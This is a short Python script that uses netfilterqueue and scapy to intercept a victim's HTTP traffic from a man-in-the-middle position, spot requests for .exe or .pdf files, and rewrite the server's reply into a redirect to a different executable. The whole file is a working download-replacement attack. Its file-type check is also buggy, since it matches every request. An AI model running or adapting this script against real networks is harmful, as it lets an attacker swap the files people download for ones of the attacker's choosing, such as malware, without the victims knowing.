#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 10000 and "192.168.1.6" not in scapy_packet[scapy.Raw].load:
            if ".pdf" or ".exe" in scapy_packet[scapy.Raw].load:   #we can replace .exe as per user requirement with .pdf,.png,.jpg
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing Files")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-561ar.exe\n\n")
                print(scapy_packet.show())

                packet.set_payload(str(modified_packet))


    packet.accept()






queue = netfilterqueue.NetfilterQueue()
queue.bind(0 , process_packet)
queue.run()